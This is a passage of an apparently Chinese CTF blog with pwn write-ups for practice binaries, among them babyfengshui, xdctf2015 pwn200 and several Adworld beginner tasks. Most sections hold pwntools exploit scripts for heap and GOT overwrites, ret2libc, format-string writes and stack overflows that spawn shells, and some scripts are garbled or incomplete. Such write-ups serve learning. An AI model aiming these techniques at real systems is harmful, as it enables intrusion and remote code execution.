arch<br> 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011 # line11<br> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number<br> 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0011 # 0011这个就是左边的标号<br> 0004: 0x15 0x06 0x00 0x00000002  if (A == open) goto 0011<br> 0005: 0x15 0x05 0x00 0x00000101  if (A == openat) goto 0011<br> 0006: 0x15 0x04 0x00 0x00000055  if (A == creat) goto 0011<br> 0007: 0x15 0x03 0x00 0x0000009d  if (A == prctl) goto 0011<br> 0008: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0011<br> 0009: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0011<br> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW<br> 0011: 0x06 0x00 0x00 0x00051234  return ERRNO(4660)  #有任何一个不允许的系统调用出现时就反回errornumber<br></code></pre></div></td></tr></table></figure><h2 id="19-babyfengshui-33c3-2016"><a href="#19-babyfengshui-33c3-2016" class="headerlink" title="19.babyfengshui_33c3_2016"></a>19.babyfengshui_33c3_2016</h2><blockquote><p>在<a href="./glibc_malloc_srcCode.md#%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0">源代码分析</a>中的关键函数部分提到过从几个功能函数推断出存储的结构体, 这次我没注意到这个细节, 属实是hacknote这题直接源码看一遍草草了事, 一些细节给我忽略了.</p><p>善用<code>gdb.attach()</code>, 说实话这样子看堆的结构是最为直观的, 但是我又大意了, 环境和服务器的不一样也不能直接用</p><p>还有一件事, 可以把一些自动生成的名称改一下, 这样子更好看源代码</p></blockquote><p>这题认认真真的分析了一遍源代码, 又花了将近一天的时间, 我也不知道为啥会这么慢</p><ol><li>首先从add函数中看出存数据的结构体是长这个样子的</li></ol><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user</span>//总共<span class="hljs-title">user_data</span>区有0<span class="hljs-title">x80</span>字节</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">char</span> * description;<br>    <span class="hljs-keyword">char</span> name[<span class="hljs-number">0x7c</span>];<br>&#125;<br></code></pre></div></td></tr></table></figure><p>​    而且先malloc description的size(用户输入)字节, 然后再malloc user的0x80字节<br>2. delete和display没有什么特别的, 稍微看一下就可以看出add中count变量(当然是自己改的名字)<br>3. 然后update有个很蠢的检验方法, 主要是他想着user和description是相邻的而且顺序也是一样的, 这样的话我们就可以使用没有tcache的glibc版本来绕过</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">char</span> *)(v3 + *(_DWORD *)*(&amp;ptr + a1)) &gt;= (<span class="hljs-keyword">char</span> *)*(&amp;ptr + a1) - <span class="hljs-number">4</span> )<br></code></pre></div></td></tr></table></figure><ol start="4"><li>先申请三个chunk, 第三个存”/bin/sh”</li><li>将free_got 地址覆盖在chunk 1的description指针上, 通过display函数打印出来</li><li>通过LibcSearcher找出sys_addr</li><li>改写chunk 1 的description内容为sys_addr, 实际上就是改写free_got为sys_addr</li><li>调用delete(1)即可</li></ol><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#from pwn import *</span><br><span class="hljs-comment">#from LibcSearcher import *</span><br><span class="hljs-comment">#context.binary = &#x27;./babyfengshui_33c3_2016&#x27;</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>elf = ELF(<span class="hljs-string">&quot;babyfengshui_33c3_2016&quot;</span>)<br>free_got = elf.got[<span class="hljs-string">&quot;free&quot;</span>]<br>free_plt = elf.plt[<span class="hljs-string">&quot;free&quot;</span>]<br><br><span class="hljs-comment">#c = 0</span><br><span class="hljs-comment">#if c == 0:</span><br><span class="hljs-comment">#    p = remote(&quot;node4.buuoj.cn&quot;, 26834)</span><br><span class="hljs-comment">#else:</span><br><span class="hljs-comment">#    p = process(&quot;./babyfengshui_33c3_2016&quot;)</span><br><span class="hljs-comment">#</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,name,length,text</span>):</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">index</span>):</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">display</span>(<span class="hljs-params">index</span>):</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">update</span>(<span class="hljs-params">index,length,text</span>):</span><br><br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;a1&quot;</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;a2&quot;</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">0x8</span>, <span class="hljs-string">&quot;a3&quot;</span>, <span class="hljs-number">0x8</span>, <span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><br>delete(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-number">0x19c</span>, <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x198</span>+p32(free_got))<br><br>display(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">&quot;description: &quot;</span>)<br>free_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><br>libc = LibcSearcher(<span class="hljs-string">&quot;free&quot;</span>, free_addr)<br>base = free_addr - libc.dump(<span class="hljs-string">&quot;free&quot;</span>)<br>system_addr = base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br><br>update(<span class="hljs-number">1</span>, <span class="hljs-number">0x8</span>, p32(system_addr))<br>delete(<span class="hljs-number">2</span>)<br>p.sendline(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="20-xdctf2015-pwn200"><a href="#20-xdctf2015-pwn200" class="headerlink" title="20.xdctf2015_pwn200"></a>20.xdctf2015_pwn200</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">libc = ELF(<span class="hljs-string">&quot;libc-2.23.so&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;bof&quot;</span>)<br><br><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">112</span><br>payload += flat([elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>], elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>], <span class="hljs-number">1</span>, elf.got[<span class="hljs-string">&#x27;write&#x27;</span>], <span class="hljs-number">4</span>])<br><br>ru(<span class="hljs-string">b&#x27;5~!\n&#x27;</span>)<br>sl(payload)<br><br>write_addr = u32(rn(<span class="hljs-number">4</span>)[:])<br><br>base = write_addr - libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>sys_addr = base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)) <span class="hljs-comment">#就是这里只能用bytes类型, 其他没什么可注意的了</span><br><br>payload = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">112</span>, sys_addr, elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>], binsh])<br>ru(<span class="hljs-string">b&#x27;5~!\n&#x27;</span>)<br>sl(payload)<br><br>sl(<span class="hljs-string">b&#x27;cat flag&#x27;</span>)<br><br>itt()<br></code></pre></div></td></tr></table></figure><h2 id="21-inndy-rop"><a href="#21-inndy-rop" class="headerlink" title="21.inndy_rop"></a>21.inndy_rop</h2><p>这题非常之直接, 静态链接+数组定义gets函数, 摆明了就是利用ROP</p><p>但是ROP比较长, 直接使用<code>ROPgadget --binary rop --ropchain</code>让它自动生成exploit</p><p>复制粘贴, 然后完事了………</p><p>唯一要注意的就是自动生成的是python2的语法, 如果有什么str类型的数据要把他变成bytes</p><h2 id="22"><a href="#22" class="headerlink" title="22."></a>22.</h2>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PWN</tag>
      
      <tag>C语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn: 攻防世界新手区pwn题解</title>
    <link href="/2021-07/pwn-ctf-pwn2/"/>
    <url>/2021-07/pwn-ctf-pwn2/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn-攻防世界新手区pwn题解"><a href="#pwn-攻防世界新手区pwn题解" class="headerlink" title="pwn: 攻防世界新手区pwn题解"></a>pwn: 攻防世界新手区pwn题解</h1><p>Adworld的新手区水题记录。 </p><h2 id="1-get-shell"><a href="#1-get-shell" class="headerlink" title="1 get shell"></a>1 get shell</h2><p>没什么好说的。直接remote或者nc连上去就可以了。</p><h2 id="2-CGfsb"><a href="#2-CGfsb" class="headerlink" title="2 CGfsb"></a>2 CGfsb</h2><h3 id="2-1-checksec"><a href="#2-1-checksec" class="headerlink" title="2.1 checksec"></a>2.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/NLtTXI1s2VZxOgY.png" alt="1"></p><h3 id="2-2-找漏洞"><a href="#2-2-找漏洞" class="headerlink" title="2.2 找漏洞"></a>2.2 找漏洞</h3><p>IDA打开main函数。</p><p><img src="https://i.loli.net/2021/07/19/gftCLErnSAbqV7N.png" alt="2"></p><p>可以看出<code>printf(&amp;s);</code>是明显的格式化字符串漏洞。</p><p>IDA mov 从右往左.</p><p>pwnme的地址：0x804A068<img src="https://i.loli.net/2021/07/19/B41GJedNSzW7x2c.png" alt="image-20210716120017221" style="zoom:67%;" /> <strong>看清楚, 压入的是format字符串的地址!!</strong>.</p><p><img src="https://i.loli.net/2021/07/19/ylWdNF7t21mcRsY.png" alt="3"></p><h3 id="2-3-脚本"><a href="#2-3-脚本" class="headerlink" title="2.3 脚本"></a>2.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#CGfsb.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>payload = p32(<span class="hljs-number">0x804A068</span>) + <span class="hljs-string">&#x27;AAAA%10$n&#x27;</span> <span class="hljs-comment">#这个10是自己试出来的</span><br><span class="hljs-comment">#payload = &#x27;AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p&#x27;</span><br>r = process(<span class="hljs-string">&#x27;./CGfsb&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;name:\n&#x27;</span>,<span class="hljs-string">&#x27;name&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;please:\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="3-when-did-you-born"><a href="#3-when-did-you-born" class="headerlink" title="3 when did you born"></a>3 when did you born</h2><h3 id="3-1-checksec"><a href="#3-1-checksec" class="headerlink" title="3.1 checksec"></a>3.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/m75TCOwzUhu4naY.png" alt="4"></p><h3 id="3-2-找漏洞"><a href="#3-2-找漏洞" class="headerlink" title="3.2 找漏洞"></a>3.2 找漏洞</h3><p>IDA64打开。</p><img src="https://i.loli.net/2021/07/19/kiDx1ElBSs3a9QP.png" alt="5" style="zoom: 77%;" /><p>很明显，第一个输入的数字不能是1926（Excited!)</p><p>然后通过gets把他变成1926（Naive!）</p><h3 id="3-3-脚本"><a href="#3-3-脚本" class="headerlink" title="3.3 脚本"></a>3.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#when_did_you_born.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>payload = <span class="hljs-string">&#x27;AAAAAAAA&#x27;</span> + p32(<span class="hljs-number">1926</span>)<br>r = process(<span class="hljs-string">&#x27;./when_did_you_born&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;Birth?\n&#x27;</span>,<span class="hljs-string">&#x27;1925&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;Name?\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="4-hello-pwn"><a href="#4-hello-pwn" class="headerlink" title="4 hello pwn"></a>4 hello pwn</h2><h3 id="4-1-checksec"><a href="#4-1-checksec" class="headerlink" title="4.1 checksec"></a>4.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/xyLCbiM2sQ6OqnZ.png" alt="6"></p><h3 id="4-2-找漏洞"><a href="#4-2-找漏洞" class="headerlink" title="4.2 找漏洞"></a>4.2 找漏洞</h3><p><img src="https://i.loli.net/2021/07/19/F1EKL38tD4lCkjm.png" alt="7"></p><p>逻辑很简单，在<code>unk_601068</code>读入一个值，让<code>dword_60106c</code>变为<code>1853186401</code>即可。</p><h3 id="4-3-脚本"><a href="#4-3-脚本" class="headerlink" title="4.3 脚本"></a>4.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#hello_pen.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;AAAA&#x27;</span> + p32(<span class="hljs-number">1853186401</span>)<span class="hljs-comment">#-&gt;转换成16进制就是八位数了, 可以p32</span><br><br>r = process(<span class="hljs-string">&#x27;./hello_pwn&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;bof\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="5-level0"><a href="#5-level0" class="headerlink" title="5 level0"></a>5 level0</h2><h3 id="5-1-checksec"><a href="#5-1-checksec" class="headerlink" title="5.1 checksec"></a>5.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/Fiunr2gLte3zOqa.png" alt="8"></p><h3 id="5-2-找漏洞"><a href="#5-2-找漏洞" class="headerlink" title="5.2 找漏洞"></a>5.2 找漏洞</h3><img src="https://i.loli.net/2021/07/19/ZqmXBSlNDhP9MVu.png" alt="9" style="zoom:67%;" /><p>这里好像有个什么东西嘛…</p><h3 id="5-3-脚本"><a href="#5-3-脚本" class="headerlink" title="5.3 脚本"></a>5.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#level0.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x88</span> + p64(<span class="hljs-number">0x400596</span>)<span class="hljs-comment">#callsystem的地址, 简单的read栈溢出</span><br><span class="hljs-comment">#r = process(&#x27;./level0&#x27;)</span><br>r = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>,<span class="hljs-number">45579</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;World\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="6-level2"><a href="#6-level2" class="headerlink" title="6 level2"></a>6 level2</h2><h3 id="6-1-checksec"><a href="#6-1-checksec" class="headerlink" title="6.1 checksec"></a>6.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/UkONFSAoqVgPyjB.png" alt="10"></p><h3 id="6-2-找漏洞"><a href="#6-2-找漏洞" class="headerlink" title="6.2 找漏洞"></a>6.2 找漏洞</h3><p>system函数！</p><img src="https://i.loli.net/2021/07/19/YKBlwLMFsot4xNy.png" alt="11" style="zoom:80%;" /><p>/bin/sh!</p><img src="https://i.loli.net/2021/07/19/dvgGrQhzkw87ZBP.png" alt="12" style="zoom:80%;" /><p>溢出地址0x8c，返回地址填plt的system地址，参数填/bin/sh的地址。奥利给！</p><p>ps. 会了才知道为什么洛神会这么简洁…..|ू･ω･` )</p><h3 id="6-3-脚本"><a href="#6-3-脚本" class="headerlink" title="6.3 脚本"></a>6.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x8c</span> + p32(<span class="hljs-number">0x8048320</span>) + <span class="hljs-string">&#x27;AAAA&#x27;</span>+ p32(<span class="hljs-number">0x804A024</span>) <span class="hljs-comment">#空4字节是system函数的返回地址</span><br><span class="hljs-comment">#r = remote(&#x27;111.198.29.45&#x27;,49960)</span><br>r = process(<span class="hljs-string">&quot;./level2&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;Input:\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="7-guess-num"><a href="#7-guess-num" class="headerlink" title="7 guess num"></a>7 guess num</h2><h3 id="7-1-checksec"><a href="#7-1-checksec" class="headerlink" title="7.1 checksec"></a>7.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/uN6HcDVqr28J1ml.png" alt="13"></p><h3 id="7-2-找漏洞"><a href="#7-2-找漏洞" class="headerlink" title="7.2 找漏洞"></a>7.2 找漏洞</h3><p>猜数字，先生成了个随机数，然后猜9次。猜对了给flag。</p><img src="https://i.loli.net/2021/07/19/SNmUETKHkDqcroa.png" alt="14" style="zoom:80%;" /><p>很显然，只要通过get函数把随机种子改成自己想要的就行了。</p><p>先写个脚本看看随机种子是0的情况：</p><img src="https://i.loli.net/2021/07/19/YSh74wOVLI3KpTU.png" alt="15" style="zoom:80%;" /><p>写脚本吧。字符串长度为0x30-0x10=0x20。偏移值后面加个0就行。</p><h3 id="7-3-脚本"><a href="#7-3-脚本" class="headerlink" title="7.3 脚本"></a>7.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>l = [<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>]<br>payload = <span class="hljs-string">&#x27;A&#x27;</span>* <span class="hljs-number">0x20</span> + p32(<span class="hljs-number">0</span>)<br>r = process(<span class="hljs-string">&#x27;./guess_num&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;name:&#x27;</span>,payload)<br><span class="hljs-keyword">for</span> each <span class="hljs-keyword">in</span> l:<br>r.sendlineafter(<span class="hljs-string">&#x27;number:&#x27;</span>,<span class="hljs-built_in">str</span>(each))<span class="hljs-comment">#sendlineafter的参数就是字符串</span><br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="8-int-overflow"><a href="#8-int-overflow" class="headerlink" title="8 int overflow"></a>8 int overflow</h2><h3 id="8-1-checksec"><a href="#8-1-checksec" class="headerlink" title="8.1 checksec"></a>8.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/N6oXuSjhaAGOz4x.png" alt="16"></p><h3 id="8-2-找漏洞"><a href="#8-2-找漏洞" class="headerlink" title="8.2 找漏洞"></a>8.2 找漏洞</h3><img src="https://i.loli.net/2021/07/19/xEalQB5bc1ovGXy.png" alt="17" style="zoom:80%;" /><p>先进这个函数。</p><p><img src="https://i.loli.net/2021/07/19/n82u3GmtfbsLcjk.png" alt="18"></p><p>显而易见嘛。(?)</p><p>再进check_passwd()</p><p><img src="https://i.loli.net/2021/07/19/MVbGalDqcB3miJp.png" alt="image-20210716122047227" style="zoom: 80%;" />可以看到__int8, 只有0-255, 而且有要求密码长4-8, 所以可以整数溢出的办法, buf长512也够了</p><h3 id="8-3-脚本"><a href="#8-3-脚本" class="headerlink" title="8.3 脚本"></a>8.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>r = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">50645</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p32(<span class="hljs-number">0x0804868B</span>) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">232</span><br>r.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;name:\n&quot;</span>, <span class="hljs-string">&quot;f**k&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;passwd:\n&quot;</span>, payload)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="9-cgpwn2"><a href="#9-cgpwn2" class="headerlink" title="9 cgpwn2"></a>9 cgpwn2</h2><h3 id="9-1-checksec"><a href="#9-1-checksec" class="headerlink" title="9.1 checksec"></a>9.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/dOLQ8A5XaRMDF47.png" alt="20"></p><h3 id="8-2-找漏洞-1"><a href="#8-2-找漏洞-1" class="headerlink" title="8.2 找漏洞"></a>8.2 找漏洞</h3><p><img src="https://i.loli.net/2021/07/19/KJQpnbUuq5aoPOl.png" alt="21"></p><p>溢出点肯定就是gets函数啦。偏移值0x2A。<br>但是我们需要自己构造system函数的参数，只要把name的值改成那个值就行了。</p><h3 id="9-3-脚本"><a href="#9-3-脚本" class="headerlink" title="9.3 脚本"></a>9.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x2A</span>(<span class="hljs-string">&#x27;捏妈的,0x26+0x4能给我算成0x30来?&#x27;</span>) + p32(<span class="hljs-number">0x8048420</span>) + <span class="hljs-string">&#x27;AAAA&#x27;</span>-&gt;sys返回地址<span class="hljs-string">&#x27; + p32(0x804A080)&#x27;</span>name的地址<span class="hljs-string">&#x27;</span><br><span class="hljs-string">r = process(&#x27;</span>./cgpwn2<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">r.sendlineafter(&#x27;</span>name\n<span class="hljs-string">&#x27;,&#x27;</span>/<span class="hljs-built_in">bin</span>/sh<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">r.sendlineafter(&#x27;</span>here:\n<span class="hljs-string">&#x27;,payload)</span><br><span class="hljs-string">r.interactive()</span><br></code></pre></div></td></tr></table></figure><h2 id="10-string"><a href="#10-string" class="headerlink" title="10 string"></a>10 string</h2><h3 id="10-1-checksec"><a href="#10-1-checksec" class="headerlink" title="10.1 checksec"></a>10.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/f6NWvTAL2tYuKkr.png" alt="22"></p><h3 id="10-2-找漏洞"><a href="#10-2-找漏洞" class="headerlink" title="10.2 找漏洞"></a>10.2 找漏洞</h3><p>代码好长啊。</p><img src="https://i.loli.net/2021/07/19/32uH7CzocNe4bKE.png" alt="23" style="zoom:80%;" /><p>看看func1。</p><img src="https://i.loli.net/2021/07/19/JI9wTKFP6li1gZV.png" alt="24" style="zoom: 80%;" /><p>func2。</p><img src="https://i.loli.net/2021/07/19/AscTUzQ9x1KXBR8.png" alt="25" style="zoom:80%;" /><p>没有溢出点。func3。</p><img src="https://i.loli.net/2021/07/19/3DxVSQvWNoB58ea.png" alt="26" style="zoom:80%;" /><p>好啦，溢出点。</p><p><img src="https://i.loli.net/2021/07/19/vAengmcpkH6dqK4.png" alt="27"></p><p>很明显，让a1数组的第0位和第1位相等（就是85和68）。</p><p>后面那个mmap是内存映射，意思就是填入一个机器码使得直接执行。</p><h3 id="10-3-脚本"><a href="#10-3-脚本" class="headerlink" title="10.3 脚本"></a>10.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;%68c%7$n&#x27;</span><span class="hljs-comment"># b&#x27;a&#x27;*85 + &#x27;%7$n&#x27;也是可以的</span><br>r = process(<span 